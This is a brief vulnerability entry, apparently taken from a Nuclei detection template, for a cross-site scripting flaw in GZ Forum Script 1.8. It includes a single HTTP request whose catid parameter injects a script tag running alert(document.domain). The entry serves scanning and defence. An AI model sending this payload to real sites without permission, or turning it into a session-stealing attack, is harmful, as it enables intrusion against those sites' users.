# Vulnerability: GZ Forum Script 1.8 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`gz-forum-script-xss.yaml`)

## Description
Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a
```

